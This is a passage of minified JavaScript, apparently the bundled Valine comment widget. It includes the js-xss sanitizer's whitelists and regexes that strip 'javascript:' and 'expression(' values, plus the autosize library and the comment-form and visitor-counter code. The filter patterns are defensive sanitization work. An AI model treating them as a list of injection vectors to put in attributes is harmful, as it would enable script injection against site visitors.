"overflow-x":!1,"overflow-y":!1,padding:!0,"padding-bottom":!0,"padding-left":!0,"padding-right":!0,"padding-top":!0,page:!1,"page-break-after":!1,"page-break-before":!1,"page-break-inside":!1,"page-policy":!1,pause:!1,"pause-after":!1,"pause-before":!1,perspective:!1,"perspective-origin":!1,pitch:!1,"pitch-range":!1,"play-during":!1,position:!1,"presentation-level":!1,quotes:!1,"region-fragment":!1,resize:!1,rest:!1,"rest-after":!1,"rest-before":!1,richness:!1,right:!1,rotation:!1,"rotation-point":!1,"ruby-align":!1,"ruby-merge":!1,"ruby-position":!1,"shape-image-threshold":!1,"shape-outside":!1,"shape-margin":!1,size:!1,speak:!1,"speak-as":!1,"speak-header":!1,"speak-numeral":!1,"speak-punctuation":!1,"speech-rate":!1,stress:!1,"string-set":!1,"tab-size":!1,"table-layout":!1,"text-align":!0,"text-align-last":!0,"text-combine-upright":!0,"text-decoration":!0,"text-decoration-color":!0,"text-decoration-line":!0,"text-decoration-skip":!0,"text-decoration-style":!0,"text-emphasis":!0,"text-emphasis-color":!0,"text-emphasis-position":!0,"text-emphasis-style":!0,"text-height":!0,"text-indent":!0,"text-justify":!0,"text-orientation":!0,"text-overflow":!0,"text-shadow":!0,"text-space-collapse":!0,"text-transform":!0,"text-underline-position":!0,"text-wrap":!0,top:!1,transform:!1,"transform-origin":!1,"transform-style":!1,transition:!1,"transition-delay":!1,"transition-duration":!1,"transition-property":!1,"transition-timing-function":!1,"unicode-bidi":!1,"vertical-align":!1,visibility:!1,"voice-balance":!1,"voice-duration":!1,"voice-family":!1,"voice-pitch":!1,"voice-range":!1,"voice-rate":!1,"voice-stress":!1,"voice-volume":!1,volume:!1,"white-space":!1,widows:!1,width:!0,"will-change":!1,"word-break":!0,"word-spacing":!0,"word-wrap":!0,"wrap-flow":!1,"wrap-through":!1,"writing-mode":!1,"z-index":!1};return e}var r=/javascript\s*\:/gim;t.whiteList=n(),t.getDefaultWhiteList=n,t.onAttr=function(e,t,n){},t.onIgnoreAttr=function(e,t,n){},t.safeAttrValue=function(e,t){return r.test(t)?"":t}},function(e,t){e.exports={indexOf:function(e,t){var n,r;if(Array.prototype.indexOf)return e.indexOf(t);for(n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},forEach:function(e,t,n){var r,a;if(Array.prototype.forEach)return e.forEach(t,n);for(r=0,a=e.length;r<a;r++)t.call(n,e[r],r,e)},trim:function(e){return String.prototype.trim?e.trim():e.replace(/(^\s*)|(\s*$)/g,"")},trimRight:function(e){return String.prototype.trimRight?e.trimRight():e.replace(/(\s*$)/g,"")}}},function(e,t,n){"use strict";var r=n(40),a="function"==typeof Symbol&&"symbol"==typeof Symbol("foo"),o=Object.prototype.toString,i=Array.prototype.concat,s=Object.defineProperty,l=s&&function(){var e={};try{for(var t in s(e,"x",{enumerable:!1,value:e}),e)return!1;return e.x===e}catch(e){return!1}}(),c=function(e,t,n,r){(!(t in e)||function(e){return"function"==typeof e&&"[object Function]"===o.call(e)}(r)&&r())&&(l?s(e,t,{configurable:!0,enumerable:!1,value:n,writable:!0}):e[t]=n)},u=function(e,t){var n=arguments.length>2?arguments[2]:{},o=r(t);a&&(o=i.call(o,Object.getOwnPropertySymbols(t)));for(var s=0;s<o.length;s+=1)c(e,o[s],t[o[s]],n[o[s]])};u.supportsDescriptors=!!l,e.exports=u},function(e,t,n){"use strict";var r=Object.prototype.toString;e.exports=function(e){var t=r.call(e),n="[object Arguments]"===t;return n||(n="[object Array]"!==t&&null!==e&&"object"==typeof e&&"number"==typeof e.length&&e.length>=0&&"[object Function]"===r.call(e.callee)),n}},function(e,t,n){"use strict";var r=n(45),a=n(44),o=n(46)("String.prototype.replace"),i=/^[\x09\x0A\x0B\x0C\x0D\x20\xA0\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\u2028\u2029\uFEFF]+/,s=/[\x09\x0A\x0B\x0C\x0D\x20\xA0\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\u2028\u2029\uFEFF]+$/;e.exports=function(){var e=a(r(this));return o(o(e,i,""),s,"")}},function(e,t,n){"use strict";var r=n(4),a=n(1)("%Function%"),o=a.apply,i=a.call;e.exports=function(){return r.apply(i,arguments)},e.exports.apply=function(){return r.apply(o,arguments)}},function(e,t,n){"use strict";var r=n(11);e.exports=function(){return String.prototype.trim&&"​"==="​".trim()?String.prototype.trim:r}},function(e,t){var n;n=function(){return this}();try{n=n||Function("return this")()||(0,eval)("this")}catch(e){"object"==typeof window&&(n=window)}e.exports=n},function(e,t,n){function r(){return{a:["target","href","title"],abbr:["title"],address:[],area:["shape","coords","href","alt"],article:[],aside:[],audio:["autoplay","controls","loop","preload","src"],b:[],bdi:["dir"],bdo:["dir"],big:[],blockquote:["cite"],br:[],caption:[],center:[],cite:[],code:[],col:["align","valign","span","width"],colgroup:["align","valign","span","width"],dd:[],del:["datetime"],details:["open"],div:[],dl:[],dt:[],em:[],font:["color","size","face"],footer:[],h1:[],h2:[],h3:[],h4:[],h5:[],h6:[],header:[],hr:[],i:[],img:["src","alt","title","width","height"],ins:["datetime"],li:[],mark:[],nav:[],ol:[],p:[],pre:[],s:[],section:[],small:[],span:[],sub:[],sup:[],strong:[],table:["width","border","align","valign"],tbody:["align","valign"],td:["width","rowspan","colspan","align","valign"],tfoot:["align","valign"],th:["width","rowspan","colspan","align","valign"],thead:["align","valign"],tr:["rowspan","align","valign"],tt:[],u:[],ul:[],video:["autoplay","controls","loop","preload","src","height","width"]}}function a(e){return e.replace(m,"&lt;").replace(v,"&gt;")}function o(e){return e.replace(b,"&quot;")}function i(e){return e.replace(y,'"')}function s(e){return e.replace(x,(function(e,t){return"x"===t[0]||"X"===t[0]?String.fromCharCode(parseInt(t.substr(1),16)):String.fromCharCode(parseInt(t,10))}))}function l(e){return e.replace(k,":").replace(w," ")}function c(e){for(var t="",n=0,r=e.length;n<r;n++)t+=e.charCodeAt(n)<32?" ":e.charAt(n);return h.trim(t)}function u(e){return c(e=l(e=s(e=i(e))))}function p(e){return a(e=o(e))}var d=n(3).FilterCSS,g=n(3).getDefaultWhiteList,h=n(5),f=new d,m=/</g,v=/>/g,b=/"/g,y=/&quot;/g,x=/&#([a-zA-Z0-9]*);?/gim,k=/&colon;?/gim,w=/&newline;?/gim,S=/((j\s*a\s*v\s*a|v\s*b|l\s*i\s*v\s*e)\s*s\s*c\s*r\s*i\s*p\s*t\s*|m\s*o\s*c\s*h\s*a)\:/gi,_=/e\s*x\s*p\s*r\s*e\s*s\s*s\s*i\s*o\s*n\s*\(.*/gi,T=/u\s*r\s*l\s*\(.*/gi,j=/<!--[\s\S]*?-->/g;t.whiteList={a:["target","href","title"],abbr:["title"],address:[],area:["shape","coords","href","alt"],article:[],aside:[],audio:["autoplay","controls","loop","preload","src"],b:[],bdi:["dir"],bdo:["dir"],big:[],blockquote:["cite"],br:[],caption:[],center:[],cite:[],code:[],col:["align","valign","span","width"],colgroup:["align","valign","span","width"],dd:[],del:["datetime"],details:["open"],div:[],dl:[],dt:[],em:[],font:["color","size","face"],footer:[],h1:[],h2:[],h3:[],h4:[],h5:[],h6:[],header:[],hr:[],i:[],img:["src","alt","title","width","height"],ins:["datetime"],li:[],mark:[],nav:[],ol:[],p:[],pre:[],s:[],section:[],small:[],span:[],sub:[],sup:[],strong:[],table:["width","border","align","valign"],tbody:["align","valign"],td:["width","rowspan","colspan","align","valign"],tfoot:["align","valign"],th:["width","rowspan","colspan","align","valign"],thead:["align","valign"],tr:["rowspan","align","valign"],tt:[],u:[],ul:[],video:["autoplay","controls","loop","preload","src","height","width"]},t.getDefaultWhiteList=r,t.onTag=function(e,t,n){},t.onIgnoreTag=function(e,t,n){},t.onTagAttr=function(e,t,n){},t.onIgnoreTagAttr=function(e,t,n){},t.safeAttrValue=function(e,t,n,r){if(n=u(n),"href"===t||"src"===t){if("#"===(n=h.trim(n)))return"#";if("http://"!==n.substr(0,7)&&"https://"!==n.substr(0,8)&&"mailto:"!==n.substr(0,7)&&"tel:"!==n.substr(0,4)&&"#"!==n[0]&&"/"!==n[0])return""}else if("background"===t){if(S.lastIndex=0,S.test(n))return""}else if("style"===t){if(_.lastIndex=0,_.test(n))return"";if(T.lastIndex=0,T.test(n)&&(S.lastIndex=0,S.test(n)))return"";!1!==r&&(n=(r=r||f).process(n))}return p(n)},t.escapeHtml=a,t.escapeQuote=o,t.unescapeQuote=i,t.escapeHtmlEntities=s,t.escapeDangerHtml5Entities=l,t.clearNonPrintableCharacter=c,t.friendlyAttrValue=u,t.escapeAttrValue=p,t.onIgnoreTagStripAll=function(){return""},t.StripTagBody=function(e,t){function n(t){return!!r||-1!==h.indexOf(e,t)}"function"!=typeof t&&(t=function(){});var r=!Array.isArray(e),a=[],o=!1;return{onIgnoreTag:function(e,r,i){if(n(e)){if(i.isClosing){var s="[/removed]",l=i.position+s.length;return a.push([!1!==o?o:i.position,l]),o=!1,s}return o||(o=i.position),"[removed]"}return t(e,r,i)},remove:function(e){var t="",n=0;return h.forEach(a,(function(r){t+=e.slice(n,r[0]),n=r[1]})),t+=e.slice(n)}}},t.stripCommentTag=function(e){return e.replace(j,"")},t.stripBlankChar=function(e){var t=e.split("");return(t=t.filter((function(e){var t=e.charCodeAt(0);return!(127===t||t<=31&&10!==t&&13!==t)}))).join("")},t.cssFilter=f,t.getDefaultCSSWhiteList=g},function(e,t,n){function r(e){var t=l.spaceIndex(e);if(-1===t)var n=e.slice(1,-1);else n=e.slice(1,t+1);return"/"===(n=l.trim(n).toLowerCase()).slice(0,1)&&(n=n.slice(1)),"/"===n.slice(-1)&&(n=n.slice(0,-1)),n}function a(e){return"</"===e.slice(0,2)}function o(e,t){for(;t<e.length;t++){var n=e[t];if(" "!==n)return"="===n?t:-1}}function i(e,t){for(;t>0;t--){var n=e[t];if(" "!==n)return"="===n?t:-1}}function s(e){return function(e){return'"'===e[0]&&'"'===e[e.length-1]||"'"===e[0]&&"'"===e[e.length-1]}(e)?e.substr(1,e.length-2):e}var l=n(5),c=/[^a-zA-Z0-9_:\.\-]/gim;t.parseTag=function(e,t,n){var o="",i=0,s=!1,l=!1,c=0,u=e.length,p="",d="";for(c=0;c<u;c++){var g=e.charAt(c);if(!1===s){if("<"===g){s=c;continue}}else if(!1===l){if("<"===g){o+=n(e.slice(i,c)),s=c,i=c;continue}if(">"===g){o+=n(e.slice(i,s)),p=r(d=e.slice(s,c+1)),o+=t(s,o.length,p,d,a(d)),i=c+1,s=!1;continue}if(('"'===g||"'"===g)&&"="===e.charAt(c-1)){l=g;continue}}else if(g===l){l=!1;continue}}return i<e.length&&(o+=n(e.substr(i))),o},t.parseAttr=function(e,t){function n(e,n){if(!((e=(e=l.trim(e)).replace(c,"").toLowerCase()).length<1)){var r=t(e,n||"");r&&a.push(r)}}for(var r=0,a=[],u=!1,p=e.length,d=0;d<p;d++){var g,h=e.charAt(d);if(!1!==u||"="!==h)if(!1===u||d!==r||'"'!==h&&"'"!==h||"="!==e.charAt(d-1)){if(/\s|\n|\t/.test(h)){if(e=e.replace(/\s|\n|\t/g," "),!1===u){if(-1===(g=o(e,d))){n(l.trim(e.slice(r,d))),u=!1,r=d+1;continue}d=g-1;continue}if(-1===(g=i(e,d-1))){n(u,s(l.trim(e.slice(r,d)))),u=!1,r=d+1;continue}}}else{if(-1===(g=e.indexOf(h,d+1)))break;n(u,l.trim(e.slice(r+1,g))),u=!1,r=(d=g)+1}else u=e.slice(r,d),r=d+1}return r<e.length&&(!1===u?n(e.slice(r)):n(u,s(l.trim(e.slice(r))))),l.trim(a.join(" "))}},function(e,t,n){var r,a,o;
/*!
	autosize 4.0.2
	license: MIT
	http://www.jacklmoore.com/autosize
*/a=[e,t],r=function(e,t){"use strict";function n(e){function t(t){var n=e.style.width;e.style.width="0px",e.offsetWidth,e.style.width=n,e.style.overflowY=t}function n(){if(0!==e.scrollHeight){var t=function(e){for(var t=[];e&&e.parentNode&&e.parentNode instanceof Element;)e.parentNode.scrollTop&&t.push({node:e.parentNode,scrollTop:e.parentNode.scrollTop}),e=e.parentNode;return t}(e),n=document.documentElement&&document.documentElement.scrollTop;e.style.height="",e.style.height=e.scrollHeight+a+"px",s=e.clientWidth,t.forEach((function(e){e.node.scrollTop=e.scrollTop})),n&&(document.documentElement.scrollTop=n)}}function r(){n();var r=Math.round(parseFloat(e.style.height)),a=window.getComputedStyle(e,null),o="content-box"===a.boxSizing?Math.round(parseFloat(a.height)):e.offsetHeight;if(o<r?"hidden"===a.overflowY&&(t("scroll"),n(),o="content-box"===a.boxSizing?Math.round(parseFloat(window.getComputedStyle(e,null).height)):e.offsetHeight):"hidden"!==a.overflowY&&(t("hidden"),n(),o="content-box"===a.boxSizing?Math.round(parseFloat(window.getComputedStyle(e,null).height)):e.offsetHeight),l!==o){l=o;var s=i("autosize:resized");try{e.dispatchEvent(s)}catch(e){}}}if(e&&e.nodeName&&"TEXTAREA"===e.nodeName&&!o.has(e)){var a=null,s=null,l=null,c=function(){e.clientWidth!==s&&r()},u=function(t){window.removeEventListener("resize",c,!1),e.removeEventListener("input",r,!1),e.removeEventListener("keyup",r,!1),e.removeEventListener("autosize:destroy",u,!1),e.removeEventListener("autosize:update",r,!1),Object.keys(t).forEach((function(n){e.style[n]=t[n]})),o.delete(e)}.bind(e,{height:e.style.height,resize:e.style.resize,overflowY:e.style.overflowY,overflowX:e.style.overflowX,wordWrap:e.style.wordWrap});e.addEventListener("autosize:destroy",u,!1),"onpropertychange"in e&&"oninput"in e&&e.addEventListener("keyup",r,!1),window.addEventListener("resize",c,!1),e.addEventListener("input",r,!1),e.addEventListener("autosize:update",r,!1),e.style.overflowX="hidden",e.style.wordWrap="break-word",o.set(e,{destroy:u,update:r}),function(){var t=window.getComputedStyle(e,null);"vertical"===t.resize?e.style.resize="none":"both"===t.resize&&(e.style.resize="horizontal"),a="content-box"===t.boxSizing?-(parseFloat(t.paddingTop)+parseFloat(t.paddingBottom)):parseFloat(t.borderTopWidth)+parseFloat(t.borderBottomWidth),isNaN(a)&&(a=0),r()}()}}function r(e){var t=o.get(e);t&&t.destroy()}function a(e){var t=o.get(e);t&&t.update()}var o="function"==typeof Map?new Map:function(){var e=[],t=[];return{has:function(t){return e.indexOf(t)>-1},get:function(n){return t[e.indexOf(n)]},set:function(n,r){-1===e.indexOf(n)&&(e.push(n),t.push(r))},delete:function(n){var r=e.indexOf(n);r>-1&&(e.splice(r,1),t.splice(r,1))}}}(),i=function(e){return new Event(e,{bubbles:!0})};try{new Event("test")}catch(e){i=function(e){var t=document.createEvent("Event");return t.initEvent(e,!0,!1),t}}var s=null;"undefined"==typeof window||"function"!=typeof window.getComputedStyle?((s=function(e){return e}).destroy=function(e){return e},s.update=function(e){return e}):((s=function(e,t){return e&&Array.prototype.forEach.call(e.length?e:[e],(function(e){return n(e)})),e}).destroy=function(e){return e&&Array.prototype.forEach.call(e.length?e:[e],r),e},s.update=function(e){return e&&Array.prototype.forEach.call(e.length?e:[e],a),e}),t.default=s,e.exports=t.default},void 0!==(o="function"==typeof r?r.apply(t,a):r)&&(e.exports=o)},function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function a(e){return!!e&&this.init(e),this}function o(e){return new a(e)}var i=r(n(26)),s=r(n(17)),l=r(n(20)),c=r(n(6)),u=n(2),p=r(n(24)),d=r(n(0)),g=r(n(22)),h=r(n(19)),f=n(23),m=r(n(25)),v=r(n(21)),b={comment:"",nick:"",mail:"",link:"",ua:d.default.ua,url:"",QQAvatar:""},y="",x={cdn:"https://gravatar.loli.net/avatar/",ds:["mp","identicon","monsterid","wavatar","robohash","retro",""],params:"",hide:!1};a.prototype.init=function(e){if("undefined"==typeof document)throw new Error("Sorry, Valine does not support Server-side rendering.");var t=this;return e&&(e=d.default.extend(u.defaultConfig,e),t.i18n=(0,l.default)(e.lang||d.default.lang,e.langMode),t.config=e,c.default.maps=!!e.emojiMaps&&e.emojiMaps||c.default.maps,c.default.cdn=!!e.emojiCDN&&e.emojiCDN||c.default.cdn,t._init()),t},a.prototype._init=function(){var e=this;try{var t=e.config,n=t.avatar,r=t.avatarForce,a=t.avatar_cdn,o=t.visitor,i=t.path,s=void 0===i?location.pathname:i,l=t.pageSize,c=t.recordIP;e.config.path=s.replace(/index\.html?$/,"");var p=x.ds,g=r?"&q="+u.RandomStr:"";x.params="?d="+(p.indexOf(n)>-1?n:"mp")+"&v="+u.VERSION+g,x.hide="hide"===n,x.cdn=/^https?\:\/\//.test(a)?a:x.cdn,e.config.pageSize=isNaN(l)||l<1?10:l,c&&(0,f.recordIPFn)((function(e){return b.ip=e}));var m=e.config.el||null,y=(0,d.default)(m);if(m=m instanceof HTMLElement?m:y[y.length-1]||null){e.$el=(0,d.default)(m),e.$el.addClass("v").attr("data-class","v"),x.hide&&e.$el.addClass("hide-avatar"),e.config.meta=(e.config.guest_info||e.config.meta||u.defaultMeta).filter((function(e){return u.defaultMeta.indexOf(e)>-1})),e.config.requiredFields=e.config.requiredFields.filter((function(e){return u.defaultMeta.indexOf(e)>-1}));var k=(0==e.config.meta.length?u.defaultMeta:e.config.meta).map((function(t){var n="mail"==t?"email":"text";return u.defaultMeta.indexOf(t)>-1?'<input name="'+t+'" placeholder="'+e.i18n.t(t)+'" class="v'+t+' vinput" type="'+n+'">':""})),S='<div class="vpanel"><div class="vwrap"><p class="cancel-reply text-right" style="display:none;" title="'+e.i18n.t("cancelReply")+'"><svg class="vicon cancel-reply-btn" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4220" width="22" height="22"><path d="M796.454 985H227.545c-50.183 0-97.481-19.662-133.183-55.363-35.7-35.701-55.362-83-55.362-133.183V227.545c0-50.183 19.662-97.481 55.363-133.183 35.701-35.7 83-55.362 133.182-55.362h568.909c50.183 0 97.481 19.662 133.183 55.363 35.701 35.702 55.363 83 55.363 133.183v568.909c0 50.183-19.662 97.481-55.363 133.183S846.637 985 796.454 985zM227.545 91C152.254 91 91 152.254 91 227.545v568.909C91 871.746 152.254 933 227.545 933h568.909C871.746 933 933 871.746 933 796.454V227.545C933 152.254 871.746 91 796.454 91H227.545z" p-id="4221"></path><path d="M568.569 512l170.267-170.267c15.556-15.556 15.556-41.012 0-56.569s-41.012-15.556-56.569 0L512 455.431 341.733 285.165c-15.556-15.556-41.012-15.556-56.569 0s-15.556 41.012 0 56.569L455.431 512 285.165 682.267c-15.556 15.556-15.556 41.012 0 56.569 15.556 15.556 41.012 15.556 56.569 0L512 568.569l170.267 170.267c15.556 15.556 41.012 15.556 56.569 0 15.556-15.556 15.556-41.012 0-56.569L568.569 512z" p-id="4222" ></path></svg></p><div class="vheader item'+k.length+'">'+k.join("")+'</div><div class="vedit"><textarea id="veditor" class="veditor vinput" placeholder="'+e.config.placeholder+'"></textarea><div class="vrow"><div class="vcol vcol-60 status-bar"></div><div class="vcol vcol-40 vctrl text-right"><span title="'+e.i18n.t("emoji")+'"  class="vicon vemoji-btn"><svg  viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="16172" width="22" height="22" ><path d="M512 1024a512 512 0 1 1 512-512 512 512 0 0 1-512 512zM512 56.888889a455.111111 455.111111 0 1 0 455.111111 455.111111 455.111111 455.111111 0 0 0-455.111111-455.111111zM312.888889 512A85.333333 85.333333 0 1 1 398.222222 426.666667 85.333333 85.333333 0 0 1 312.888889 512z" p-id="16173"></path><path d="M512 768A142.222222 142.222222 0 0 1 369.777778 625.777778a28.444444 28.444444 0 0 1 56.888889 0 85.333333 85.333333 0 0 0 170.666666 0 28.444444 28.444444 0 0 1 56.888889 0A142.222222 142.222222 0 0 1 512 768z" p-id="16174"></path><path d="M782.222222 391.964444l-113.777778 59.733334a29.013333 29.013333 0 0 1-38.684444-10.808889 28.444444 28.444444 0 0 1 10.24-38.684445l113.777778-56.888888a28.444444 28.444444 0 0 1 38.684444 10.24 28.444444 28.444444 0 0 1-10.24 36.408888z" p-id="16175"></path><path d="M640.568889 451.697778l113.777778 56.888889a27.875556 27.875556 0 0 0 38.684444-10.24 27.875556 27.875556 0 0 0-10.24-38.684445l-113.777778-56.888889a28.444444 28.444444 0 0 0-38.684444 10.808889 28.444444 28.444444 0 0 0 10.24 38.115556z" p-id="16176"></path></svg></span><span title="'+e.i18n.t("preview")+'" class="vicon vpreview-btn"><svg  viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="17688" width="22" height="22"><path d="M502.390154 935.384615a29.538462 29.538462 0 1 1 0 59.076923H141.430154C79.911385 994.461538 29.538462 946.254769 29.538462 886.153846V137.846154C29.538462 77.745231 79.950769 29.538462 141.390769 29.538462h741.218462c61.44 0 111.852308 48.206769 111.852307 108.307692v300.268308a29.538462 29.538462 0 1 1-59.076923 0V137.846154c0-26.899692-23.355077-49.230769-52.775384-49.230769H141.390769c-29.420308 0-52.775385 22.331077-52.775384 49.230769v748.307692c0 26.899692 23.355077 49.230769 52.775384 49.230769h360.999385z" p-id="17689"></path><path d="M196.923077 216.615385m29.538461 0l374.153847 0q29.538462 0 29.538461 29.538461l0 0q0 29.538462-29.538461 29.538462l-374.153847 0q-29.538462 0-29.538461-29.538462l0 0q0-29.538462 29.538461-29.538461Z" p-id="17690"></path><path d="M649.846154 846.769231a216.615385 216.615385 0 1 0 0-433.230769 216.615385 216.615385 0 0 0 0 433.230769z m0 59.076923a275.692308 275.692308 0 1 1 0-551.384616 275.692308 275.692308 0 0 1 0 551.384616z" p-id="17691"></path><path d="M807.398383 829.479768m20.886847-20.886846l0 0q20.886846-20.886846 41.773692 0l125.321079 125.321079q20.886846 20.886846 0 41.773693l0 0q-20.886846 20.886846-41.773693 0l-125.321078-125.321079q-20.886846-20.886846 0-41.773693Z" p-id="17692"></path></svg></span></div></div></div><div class="vrow"><div class="vcol vcol-30" ><a alt="Markdown is supported" href="https://guides.github.com/features/mastering-markdown/" class="vicon" target="_blank"><svg class="markdown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z"></path></svg></a></div><div class="vcol vcol-70 text-right"><button type="button"  title="Cmd|Ctrl+Enter" class="vsubmit vbtn">'+e.i18n.t("submit")+'</button></div></div><div class="vemojis" style="display:none;"></div><div class="vinput vpreview" style="display:none;"></div><div style="display:none;" class="vmark"></div></div></div><div class="vcount" style="display:none;"><span class="vnum">0</span> '+e.i18n.t("comments")+'</div><div class="vload-top text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vcards"></div><div class="vload-bottom text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vempty" style="display:none;"></div><div class="vpage txt-center" style="display:none"><button type="button" class="vmore vbtn">'+e.i18n.t("more")+'</button></div><div class="vpower txt-right">Powered By <a href="https://valine.js.org" target="_blank">Valine</a><br>v'+u.VERSION+"</div>";e.$el.html(S),e.$el.find(".cancel-reply").on("click",(function(t){e.reset()}));var _=e.$el.find(".vempty");e.$nodata={show:function(t){return _.html(t||e.i18n.t("sofa")).show(),e},hide:function(){return _.hide(),e}};var T=e.$el.find(".vload-bottom"),j=e.$el.find(".vload-top");e.$loading={show:function(t){return t&&j.show()||T.show(),e.$nodata.hide(),e},hide:function(){return j.hide(),T.hide(),0===e.$el.find(".vcard").length&&e.$nodata.show(),e}}}(0,h.default)(e.config,(function(t){var n=(0,d.default)(".valine-comment-count"),r=0;!function t(n){var a=n[r++];if(a){var o=(0,d.default)(a).attr("data-xid");o&&e.Q(o).count().then((function(e){a.innerText=e,t(n)})).catch((function(e){a.innerText=0}))}}(n),o&&w.add(AV.Object.extend("Counter"),e.config.path),e.$el&&e.bind()}))}catch(t){(0,v.default)(e,t,"init")}};var k=function(e,t){var n=new e,r=new AV.ACL;r.setPublicReadAccess(!0),r.setPublicWriteAccess(!0),n.setACL(r),n.set("url",t.url),n.set("xid",t.xid),n.set("title",t.title),n.set("time",1),n.save().then((function(e){(0,d.default)(t.el).find(".leancloud-visitors-count").text(1)})).catch((function(e){}))},w={add:function(e,t){var n=this,r=(0,d.default)(".leancloud_visitors,.leancloud-visitors");if(1===r.length){var a=r[0],o=decodeURI((0,d.default)(a).attr("id")),i=(0,d.default)(a).attr("data-flag-title"),s=encodeURI(o),l={el:a,url:o,xid:s,title:i};if(decodeURI(o)===decodeURI(t)){var c=new AV.Query(e);c.equalTo("url",o),c.find().then((function(t){if(t.length>0){var n=t[0];n.increment("time"),n.save().then((function(e){(0,d.default)(a).find(".leancloud-visitors-count").text(e.get("time"))})).catch((function(e){}))}else k(e,l)})).catch((function(t){101==t.code?k(e,l):(0,v.default)(n,t)}))}else w.show(e,r)}else w.show(e,r)},show:function(e,t){var n=[];if(t.forEach((function(e){var t=(0,d.default)(e).find(".leancloud-visitors-count");t&&t.text("0"),n.push(/\%/.test((0,d.default)(e).attr("id"))?decodeURI((0,d.default)(e).attr("id")):(0,d.default)(e).attr("id"))})),n.length){var r=new AV.Query(e);r.containedIn("url",n),r.find().then((function(e){e.length>0&&t.forEach((function(t){e.forEach((function(e){var n=e.get("xid")||encodeURI(e.get("url")),r=e.get("time"),a=(0,d.default)(t),o=a.attr("id");if((/\%/.test(o)?o:encodeURI(o))==n){var i=a.find(".leancloud-visitors-count");i&&i.text(r)}}))}))})).catch((function(e){}))}}};a.prototype.Q=function(e){var t=this,n=arguments.length,r=t.config.clazzName;if(1==n){var a=new AV.Query(r);a.doesNotExist("rid");var o=new AV.Query(r);o.equalTo("rid","");var i=AV.Query.or(a,o);return"*"===e?i.exists("url"):i.equalTo("url",decodeURI(e)),i.addDescending("createdAt"),i.addDescending("insertedAt"),i}var s=JSON.stringify(arguments[1]).replace(/(\[|\])/g,""),l="select * from "+r+" where rid in ("+s+") order by -createdAt,-createdAt";return AV.Query.doCloudQuery(l)},a.prototype.installLocale=function(e,t){return this.i18n(e,t),this},a.prototype.setPath=function(e){return this.config.path=e,this},a.prototype.bind=function(){var e=this,t=e.$el.find(".vemojis"),n=e.$el.find(".vpreview"),r=e.$el.find(".vemoji-btn"),a=e.$el.find(".vpreview-btn"),o=e.$el.find(".veditor"),l=c.default.maps,h=!1;e.$emoji={show:function(){return!h&&function(e){var n=[];for(var r in l)l.hasOwnProperty(r)&&c.default.build(r)&&n.push('<i title="'+r+'" >'+c.default.build(r)+"</i>");t.html(n.join("")),h=!0,t.find("i").on("click",(function(e){e.preventDefault(),j(o[0]," :"+(0,d.default)(this).attr("title")+":")}))}(),e.$preview.hide(),t.show(),r.addClass("actived"),e.$emoji},hide:function(){return r.removeClass("actived"),t.hide(),e.$emoji}},e.$preview={show:function(){return y?(e.$emoji.hide(),a.addClass("actived"),n.html(y).show(),L()):e.$preview.hide(),e.$preview},hide:function(){return a.removeClass("actived"),n.hide().html(""),e.$preview}};var k=function(t){var r=(0,g.default)(t.val()||"");r||e.$preview.hide(),y!=r&&(y=r,a.hasClass("actived")>-1&&y!=n.html()&&n.html(y),(0,s.default)(t[0]),L())};r.on("click",(function(t){r.hasClass("actived")?e.$emoji.hide():e.$emoji.show()})),a.on("click",(function(t){a.hasClass("actived")?e.$preview.hide():e.$preview.show()}));var w=e.config.meta,S={},_={veditor:"comment"};for(var T in w.forEach((function(e){_["v"+e]=e})),_)_.hasOwnProperty(T)&&function(){var t=_[T],n=e.$el.find("."+T);S[t]=n,n.on("input change blur propertychange",(function(r){e.config.enableQQ&&"blur"===r.type&&"nick"===t&&(isNaN(n.val())?d.default.store.get(u.QQCacheKey)&&d.default.store.get(u.QQCacheKey).nick!=n.val()&&(d.default.store.remove(u.QQCacheKey),b.nick=n.val(),b.mail="",b.QQAvatar=""):(0,f.fetchQQFn)(n.val(),(function(e){var t=e.nick||n.val(),r=e.qq+"@qq.com";(0,d.default)(".vnick").val(t),(0,d.default)(".vmail").val(r),b.nick=t,b.mail=r,b.QQAvatar=e.pic}))),"comment"===t?k(n):b[t]=d.default.escape(n.val().replace(/(^\s*)|(\s*$)/g,"")).substring(0,40)}))}();var j=function(e,t){if(document.selection)e.focus(),document.selection.createRange().text=t,e.focus();else if(e.selectionStart||"0"==e.selectionStart){var n=e.selectionStart,r=e.selectionEnd,a=e.scrollTop;e.value=e.value.substring(0,n)+t+e.value.substring(r,e.value.length),e.focus(),e.selectionStart=n+t.length,e.selectionEnd=n+t.length,e.scrollTop=a}else e.focus(),e.value+=t;setTimeout((function(t){k((0,d.default)(e))}),100)},P={no:1,size:e.config.pageSize,skip:e.config.pageSize},C=e.$el.find(".vpage");C.on("click",(function(e){C.hide(),P.no++,E()}));var E=function(){var t=P.size,n=P.no,r=Number(e.$el.find(".vnum").text());e.$loading.show();var a=e.Q(e.config.path);a.limit(t),a.skip((n-1)*t),a.find().then((function(a){if(P.skip=P.size,a&&a.length){var o=[];a.forEach((function(t){o.push(t.id),A(t,e.$el.find(".vcards"),!0)})),e.Q(e.config.path,o).then((function(e){(e&&e.results||[]).forEach((function(e){A(e,(0,d.default)('.vquote[data-self-id="'+e.get("rid")+'"]'))})).catch((function(e){}))})),t*n<r?C.show():C.hide()}else 